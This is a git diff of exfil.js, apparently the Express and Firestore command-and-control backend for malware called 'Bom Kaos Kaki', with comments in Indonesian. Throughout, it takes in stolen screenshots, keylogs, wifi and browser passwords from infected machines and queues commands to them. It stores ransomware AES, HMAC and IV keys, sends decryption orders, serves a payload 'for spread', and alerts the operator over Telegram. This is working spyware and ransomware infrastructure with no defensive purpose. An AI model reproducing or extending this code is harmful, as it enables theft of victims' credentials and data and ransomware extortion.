@@ -1,3 +1,4 @@
+// exfil.js — Backend C2 untuk Bom Kaos Kaki (Firebase Firestore + Express)
 const express = require('express');
 const admin = require('firebase-admin');
 const Busboy = require('busboy');
@@ -8,7 +9,13 @@ let serviceAccount;
 if (process.env.FIREBASE_SERVICE_ACCOUNT) {
     serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
 } else {
-    serviceAccount = require('../firebase/serviceAccount.json');
+    // Untuk local development, pastikan file serviceAccount.json ada di folder firebase
+    try {
+        serviceAccount = require('../firebase/serviceAccount.json');
+    } catch (e) {
+        console.error('Firebase service account not found. Set FIREBASE_SERVICE_ACCOUNT env var.');
+        process.exit(1);
+    }
 }
 admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
 const db = admin.firestore();
@@ -49,7 +56,7 @@ function safeString(str, maxLen = 5000) {
     return String(str).substring(0, maxLen);
 }
 
-// ============ SEND COMMAND TO TELEGRAM NOTIF ============
+// ============ TELEGRAM NOTIF (opsional) ============
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
@@ -63,17 +70,20 @@ async function sendTelegramNotif(message) {
             text: message,
             parse_mode: 'HTML'
         });
-        return new Promise((resolve, reject) => {
-            const u = new URL(url);
-            const opts = {
-                hostname: u.hostname, path: u.pathname, method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
-            };
-            const req = https.request(opts, res => { resolve(true); });
-            req.on('error', () => resolve(false));
-            req.write(payload);
-            req.end();
-        });
+        const u = new URL(url);
+        const opts = {
+            hostname: u.hostname,
+            path: u.pathname,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': payload.length
+            }
+        };
+        const reqTele = https.request(opts, () => { });
+        reqTele.on('error', () => { });
+        reqTele.write(payload);
+        reqTele.end();
     } catch (_) { }
 }
 
@@ -81,27 +91,26 @@ async function sendTelegramNotif(message) {
 router.post('/exfil', async (req, res) => {
     try {
         const contentType = req.headers['content-type'] || '';
-
         if (contentType.includes('multipart/form-data')) {
             const { fields, fileBuffer, filename } = await parseMultipart(req);
             const sessionId = fields.session_id || fields.sessionId || 'unknown';
             const type = fields.type || 'unknown';
 
             const docData = {
-                sessionId, type,
+                sessionId,
+                type,
                 filename: filename || `${type}_${Date.now()}.bin`,
                 data: fileBuffer ? fileBuffer.toString('base64') : null,
                 timestamp: admin.firestore.FieldValue.serverTimestamp(),
                 metadata: fields
             };
-
             const docRef = await db.collection('exfil').add(docData);
-
             await db.collection('agents').doc(sessionId).set({
-                sessionId, lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
-                lastExfilType: type, lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
+                sessionId,
+                lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
+                lastExfilType: type,
+                lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
             }, { merge: true });
-
             res.json({ success: true, id: docRef.id });
             return;
         }
@@ -110,22 +119,29 @@ router.post('/exfil', async (req, res) => {
         const sessionId = data.session_id || data.sessionId || 'unknown';
         const type = data.type || 'unknown';
 
-        // Jika ransomware_key, simpan di agent doc
-        if (type === 'ransomware_key' && data.data && data.data.encrypted_key) {
-            await db.collection('agents').doc(sessionId).set({
-                ransomwareEncryptedKey: data.data.encrypted_key,
+        // Untuk ransomware_key, simpan encrypted_key, hmac_key, aes_iv
+        if (type === 'ransomware_key' && data.data) {
+            const updateData = {
+                ransomwareEncryptedKey: data.data.encrypted_key || null,
+                ransomwareHmacKey: data.data.hmac_key || null,
+                ransomwareAesIv: data.data.aes_iv || null,
+                ransomwareFilesCount: data.data.files_count || 0,
+                ransomwareTargetDir: data.data.target_dir || null,
                 ransomwareTime: admin.firestore.FieldValue.serverTimestamp()
-            }, { merge: true });
+            };
+            await db.collection('agents').doc(sessionId).set(updateData, { merge: true });
         }
 
         const docData = {
-            sessionId, type, data: data.data || data,
+            sessionId,
+            type,
+            data: data.data || data,
             timestamp: admin.firestore.FieldValue.serverTimestamp()
         };
         const docRef = await db.collection('exfil').add(docData);
-
         await db.collection('agents').doc(sessionId).set({
-            sessionId, lastHeartbeat: admin.firestore.FieldValue.serverTimestamp()
+            sessionId,
+            lastHeartbeat: admin.firestore.FieldValue.serverTimestamp()
         }, { merge: true });
 
         res.json({ success: true, id: docRef.id });
@@ -139,35 +155,24 @@ router.post('/exfil', async (req, res) => {
 router.post('/heartbeat', async (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
-        const { session_id, hostname, username, os_info, ip, is_admin, process_id, modules } = data;
+        const { session_id, hostname, username, os_info, ip, group, timestamp } = data;
 
         const agentData = {
             sessionId: session_id,
             hostname: hostname || 'unknown',
             username: username || 'unknown',
-            os: os_info || data.os || 'unknown',
-            ip: ip || data.internal_ip || 'unknown',
-            isAdmin: is_admin || false,
-
-            processId: process_id || null,
-            modules: modules || [],
+            os: os_info || 'unknown',
+            ip: ip || 'unknown',
+            group: group || 'default',
             lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
             status: 'active'
         };
-
         const existing = await db.collection('agents').doc(session_id).get();
         if (!existing.exists) {
             agentData.firstSeen = admin.firestore.FieldValue.serverTimestamp();
         }
-
         await db.collection('agents').doc(session_id).set(agentData, { merge: true });
-
-        res.json({
-            success: true,
-            next_poll: 15,
-            server_time: new Date().toISOString(),
-            commands_available: 0
-        });
+        res.json({ success: true, next_poll: 15, server_time: new Date().toISOString() });
     } catch (err) {
         console.error('Heartbeat error:', err);
         res.status(500).json({ success: false, error: err.message });
@@ -181,13 +186,11 @@ router.get('/get_commands', async (req, res) => {
         if (!sessionId) {
             return res.status(400).json({ success: false, error: 'session_id required' });
         }
-
         const now = new Date().toISOString();
         const snapshot = await db.collection('commands')
             .where('target_session', 'in', [sessionId, 'all'])
             .where('status', '==', 'pending')
             .get();
-
         const commands = [];
         snapshot.forEach(doc => {
             const data = doc.data();
@@ -196,15 +199,8 @@ router.get('/get_commands', async (req, res) => {
                 commands.push({ id: doc.id, command_type: data.command_type, parameters: data.parameters || {} });
             }
         });
-
-        commands.sort((a, b) => {
-            const ta = a.parameters?.priority || 0;
-            const tb = b.parameters?.priority || 0;
-            return tb - ta;
-        });
-
+        commands.sort((a, b) => (b.parameters?.priority || 0) - (a.parameters?.priority || 0));
         const limited = commands.slice(0, 10);
-
         res.json({ success: true, commands: limited, count: limited.length });
     } catch (err) {
         console.error('Get commands error:', err);
@@ -212,16 +208,14 @@ router.get('/get_commands', async (req, res) => {
     }
 });
 
-// ============ SEND COMMAND (from Dashboard) ============
+// ============ SEND COMMAND (Dashboard) ============
 router.post('/send_command', async (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
         const { target_session, command_type, parameters, scheduled_time } = data;
-
         if (!target_session || !command_type) {
             return res.status(400).json({ success: false, error: 'Missing target_session or command_type' });
         }
-
         const commandDoc = {
             target_session,
             command_type,
@@ -231,16 +225,10 @@ router.post('/send_command', async (req, res) => {
             scheduled_time: scheduled_time || new Date().toISOString(),
             created_by: data.created_by || 'dashboard'
         };
-
         const docRef = await db.collection('commands').add(commandDoc);
-
-        // Notif Telegram
         const agentDoc = await db.collection('agents').doc(target_session).get();
         const agentName = agentDoc.exists ? agentDoc.data().hostname : target_session;
-        sendTelegramNotif(
-            `🎯 <b>Command Sent</b>\nTarget: ${agentName}\nType: ${command_type}\nID: ${docRef.id}`
-        );
-
+        sendTelegramNotif(`🎯 <b>Command Sent</b>\nTarget: ${agentName}\nType: ${command_type}\nID: ${docRef.id}`);
         res.json({ success: true, command_id: docRef.id });
     } catch (err) {
         console.error('Send command error:', err);
@@ -253,11 +241,9 @@ router.post('/command_complete', async (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
         const { command_id, status, result, error, session_id, command_type } = data;
-
         if (!command_id) {
             return res.status(400).json({ success: false, error: 'command_id required' });
         }
-
         await db.collection('commands').doc(command_id).update({
             status: status || 'completed',
             completed_at: admin.firestore.FieldValue.serverTimestamp(),
@@ -265,7 +251,6 @@ router.post('/command_complete', async (req, res) => {
             error: safeString(error || ''),
             completed_by: session_id || 'unknown'
         });
-
         await db.collection('exfil').add({
             sessionId: session_id || 'unknown',
             type: 'command_result',
@@ -276,7 +261,6 @@ router.post('/command_complete', async (req, res) => {
             error: safeString(error || ''),
             timestamp: admin.firestore.FieldValue.serverTimestamp()
         });
-
         res.json({ success: true });
     } catch (err) {
         console.error('Command complete error:', err);
@@ -287,15 +271,9 @@ router.post('/command_complete', async (req, res) => {
 // ============ AGENTS ============
 router.get('/agents', async (req, res) => {
     try {
-        const snapshot = await db.collection('agents')
-            .orderBy('lastHeartbeat', 'desc')
-            .get();
-
+        const snapshot = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
         const agents = [];
-        snapshot.forEach(doc => {
-            agents.push({ id: doc.id, ...doc.data() });
-        });
-
+        snapshot.forEach(doc => agents.push({ id: doc.id, ...doc.data() }));
         res.json({ success: true, agents });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
@@ -306,28 +284,20 @@ router.delete('/agents/:id', async (req, res) => {
     try {
         const agentId = req.params.id;
         await db.collection('agents').doc(agentId).delete();
-
-        // Hapus juga data exfil terkait
-        const exfilSnap = await db.collection('exfil')
-            .where('sessionId', '==', agentId)
-            .get();
-
+        // Hapus exfil data terkait
+        const exfilSnap = await db.collection('exfil').where('sessionId', '==', agentId).get();
         const batch = db.batch();
         exfilSnap.forEach(doc => batch.delete(doc.ref));
         await batch.commit();
-
         // Hapus pending commands
         const cmdSnap = await db.collection('commands')
             .where('target_session', '==', agentId)
             .where('status', '==', 'pending')
             .get();
-
         const cmdBatch = db.batch();
         cmdSnap.forEach(doc => cmdBatch.delete(doc.ref));
         await cmdBatch.commit();
-
         sendTelegramNotif(`🗑️ <b>Agent Deleted</b>\nSession: ${agentId.substring(0, 8)}...`);
-
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
@@ -340,23 +310,18 @@ router.get('/exfil_data', async (req, res) => {
         const sessionId = req.query.session_id || null;
         const type = req.query.type || null;
         const limit = parseInt(req.query.limit) || 200;
-
         let query = db.collection('exfil').orderBy('timestamp', 'desc').limit(limit);
         const snapshot = await query.get();
-
         const items = [];
         snapshot.forEach(doc => {
             const data = doc.data();
             let match = true;
-
             if (sessionId && data.sessionId !== sessionId) match = false;
             if (type && type !== 'all' && data.type !== type) match = false;
-
             if (match) {
                 items.push({ id: doc.id, ...data });
             }
         });
-
         res.json({ success: true, data: items, count: items.length });
     } catch (err) {
         console.error('Exfil data error:', err);
@@ -371,22 +336,21 @@ router.post('/decrypt_session', async (req, res) => {
         if (!session_id || !private_key) {
             return res.status(400).json({ success: false, error: 'Missing session_id or private_key' });
         }
-
         const agentDoc = await db.collection('agents').doc(session_id).get();
         if (!agentDoc.exists) {
             return res.status(404).json({ success: false, error: 'Session not found' });
         }
-
         const encryptedKeyBase64 = agentDoc.data().ransomwareEncryptedKey;
+        const hmacKey = agentDoc.data().ransomwareHmacKey;
+        const aesIv = agentDoc.data().ransomwareAesIv;
+        const targetDir = agentDoc.data().ransomwareTargetDir || '$env:USERPROFILE';
         if (!encryptedKeyBase64) {
             return res.status(404).json({ success: false, error: 'No ransomware key for this session' });
         }
-
         let pemKey = private_key;
         if (!private_key.includes('-----BEGIN')) {
             pemKey = `-----BEGIN PRIVATE KEY-----\n${private_key}\n-----END PRIVATE KEY-----`;
         }
-
         const encryptedBuffer = Buffer.from(encryptedKeyBase64, 'base64');
         let decryptedKey;
         try {
@@ -394,36 +358,36 @@ router.post('/decrypt_session', async (req, res) => {
                 { key: pemKey, padding: crypto.constants.RSA_PKCS1_PADDING },
                 encryptedBuffer
             ).toString('utf8');
-        } catch (_) {
+        } catch (e) {
             try {
                 decryptedKey = crypto.privateDecrypt(
                     { key: pemKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
                     encryptedBuffer
                 ).toString('utf8');
-            } catch (__) {
-                return res.status(400).json({ success: false, error: 'Failed to decrypt with provided key. Check private key format.' });
+            } catch (e2) {
+                return res.status(400).json({ success: false, error: 'Decryption failed. Check private key format.' });
             }
         }
-
         const commandRef = await db.collection('commands').add({
             target_session: session_id,
             command_type: 'decrypt',
-            parameters: { key: decryptedKey },
+            parameters: {
+                key: decryptedKey,
+                hmac_key: hmacKey,
+                iv: aesIv,
+                target_dir: targetDir
+            },
             status: 'pending',
             scheduled_time: new Date().toISOString(),
             created_at: admin.firestore.FieldValue.serverTimestamp(),
             created_by: 'dashboard'
         });
-
         const agentName = agentDoc.data().hostname || session_id;
-        sendTelegramNotif(
-            `🔓 <b>Decrypt Command Sent</b>\nTarget: ${agentName}\nKey length: ${decryptedKey.length} chars`
-        );
-
+        sendTelegramNotif(`🔓 <b>Decrypt Command Sent</b>\nTarget: ${agentName}\nAES Key: ${decryptedKey.substring(0, 20)}...`);
         res.json({
             success: true,
             command_id: commandRef.id,
-            message: 'Decrypt command sent to agent. Agent will restore files on next poll.',
+            message: 'Decrypt command sent to agent.',
             decrypted_key_preview: decryptedKey.substring(0, 20) + '...'
         });
     } catch (err) {
@@ -436,45 +400,24 @@ router.post('/decrypt_session', async (req, res) => {
 router.get('/dashboard_data', async (req, res) => {
     try {
         const sessionId = req.query.session_id || null;
-
-        // Agents
-        let agentsQuery = db.collection('agents').orderBy('lastHeartbeat', 'desc');
-        const agentsSnap = await agentsQuery.get();
+        const agentsSnap = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
         const sessions = [];
         agentsSnap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
-
-        // Exfil summary
-        let exfilQuery = db.collection('exfil').orderBy('timestamp', 'desc').limit(2000);
-        const exfilSnap = await exfilQuery.get();
-
+        const exfilSnap = await db.collection('exfil').orderBy('timestamp', 'desc').limit(2000).get();
         const grouped = {
             screenshot: [], clipboard: [], keylog: [], keylogger: [],
-            wifi: [], browser: [], phishing: [], system_info: [],
-            spyware_connections: [], spyware_processes: [],
-            command_result: [], ransomware: [], persistence: [],
-            clean: [], destroy_bios: [], uninstall: [], heartbeat: []
+            wifi: [], browser: [], browser_passwords: [],
+            system_info: [], command_result: [], ransomware: [],
+            persistence: [], clean: [], lateral_targets: []
         };
-
         exfilSnap.forEach(doc => {
             const item = { id: doc.id, ...doc.data() };
             const t = item.type || 'unknown';
             if (sessionId && item.sessionId !== sessionId) return;
-
-            if (grouped[t]) {
-                grouped[t].push(item);
-            } else if (t.startsWith('spyware')) {
-                grouped['spyware_connections'].push(item);
-            } else {
-                grouped['command_result'].push(item);
-            }
+            if (grouped[t]) grouped[t].push(item);
+            else grouped['command_result'].push(item);
         });
-
-        // Commands summary
-        const cmdSnap = await db.collection('commands')
-            .orderBy('created_at', 'desc')
-            .limit(100)
-            .get();
-
+        const cmdSnap = await db.collection('commands').orderBy('created_at', 'desc').limit(100).get();
         const commands = [];
         cmdSnap.forEach(doc => {
             const data = doc.data();
@@ -482,8 +425,6 @@ router.get('/dashboard_data', async (req, res) => {
                 commands.push({ id: doc.id, ...data });
             }
         });
-
-        // Stats
         const stats = {
             total_sessions: sessions.length,
             active_sessions: sessions.filter(s => {
@@ -494,11 +435,9 @@ router.get('/dashboard_data', async (req, res) => {
             total_screenshots: grouped.screenshot.length,
             total_keylogs: grouped.keylog.length + grouped.keylogger.length,
             total_wifi: grouped.wifi.length,
-            total_browser: grouped.browser.length,
-            total_ransomware: grouped.ransomware.length,
-            total_phishing: grouped.phishing.length
+            total_browser: grouped.browser.length + grouped.browser_passwords.length,
+            total_ransomware: grouped.ransomware.length
         };
-
         res.json({ success: true, sessions, stats, commands, ...grouped });
     } catch (err) {
         console.error('Dashboard data error:', err);
@@ -506,20 +445,18 @@ router.get('/dashboard_data', async (req, res) => {
     }
 });
 
-// ============ WEBHOOK FOR TELEGRAM CALLBACK ============
+// ============ TELEGRAM WEBHOOK (optional) ============
 router.post('/telegram_webhook', async (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
         if (data.message && data.message.text) {
             const text = data.message.text.toLowerCase().trim();
             const chatId = data.message.chat.id;
-
             if (text === '/status') {
                 const agentsSnap = await db.collection('agents')
                     .orderBy('lastHeartbeat', 'desc')
                     .limit(5)
                     .get();
-
                 let msg = '🤖 <b>Bom Kaos Kaki C2 Status</b>\n\n';
                 let count = 0;
                 agentsSnap.forEach(doc => {
@@ -532,18 +469,15 @@ router.post('/telegram_webhook', async (req, res) => {
                     msg += `   Session: ${doc.id.substring(0, 8)}...\n`;
                     msg += `   Last HB: ${lastHb}\n\n`;
                 });
-
                 if (count === 0) msg += 'No active agents.';
-
                 const https = require('https');
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const payload = JSON.stringify({
-                    chat_id: chatId, text: msg, parse_mode: 'HTML'
-                });
-
+                const payload = JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML' });
                 const u = new URL(url);
                 const opts = {
-                    hostname: u.hostname, path: u.pathname, method: 'POST',
+                    hostname: u.hostname,
+                    path: u.pathname,
+                    method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
                 };
                 const reqTele = https.request(opts, () => { });
@@ -558,7 +492,7 @@ router.post('/telegram_webhook', async (req, res) => {
     }
 });
 
-// ============ UPLOAD PAYLOAD FOR AGENT DOWNLOAD ============
+// ============ PAYLOAD (untuk spread) ============
 router.get('/payload', async (req, res) => {
     try {
         const doc = await db.collection('config').doc('payload').get();
@@ -572,7 +506,6 @@ router.get('/payload', async (req, res) => {
         res.status(500).json({ error: err.message });
     }
 });
-
 router.post('/payload', async (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
@@ -595,7 +528,7 @@ router.get('/health', (req, res) => {
     res.json({
         status: 'ok',
         timestamp: new Date().toISOString(),
-        version: '3.0.0',
+        version: '3.5.0',
         name: 'Bom Kaos Kaki C2'
     });
 });
